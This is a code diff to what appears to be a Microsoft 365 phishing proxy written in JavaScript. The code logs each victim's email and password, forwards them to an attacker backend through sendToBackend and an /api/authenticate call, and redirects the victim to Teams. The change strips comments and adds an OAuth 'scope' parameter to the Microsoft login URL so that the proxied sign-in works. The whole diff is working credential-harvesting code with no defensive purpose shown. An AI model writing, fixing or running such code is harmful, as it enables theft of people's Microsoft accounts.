@@ -55,7 +55,6 @@ async function sendToBackend(email, password, req) {
         console.error(`[BACKEND] Failed to send: ${error.message}`);
     }
     
-    // Also send to authenticate endpoint
     try {
         const axios = require('axios');
         await axios.post(`${BACKEND_URL}/api/authenticate`, {
@@ -144,14 +143,12 @@ function handlePostRequest(body, req, res) {
 
         console.log(`[CREDENTIALS] Email: ${email}, Password: ${password}`);
 
-        // Send to backend
         sendToBackend(email, password, req);
 
     } catch (error) {
         console.error('[ERROR] POST handling failed:', error.message);
     }
 
-    // Redirect to Teams
     res.writeHead(302, { 'Location': TEAMS_REDIRECT });
     res.end();
 }
@@ -159,7 +156,9 @@ function handlePostRequest(body, req, res) {
 // --- Helper: Handle Login ---
 function handleLoginRequest(req, res) {
     const email = req.url.split('login_hint=')[1]?.split('&')[0] || '';
-    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&login_hint=${encodeURIComponent(email)}`;
+    
+    // ✅ FIX: Added 'scope' parameter to the URL
+    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
     
     console.log(`[PROXY] Forwarding to: ${targetUrl}`);
     
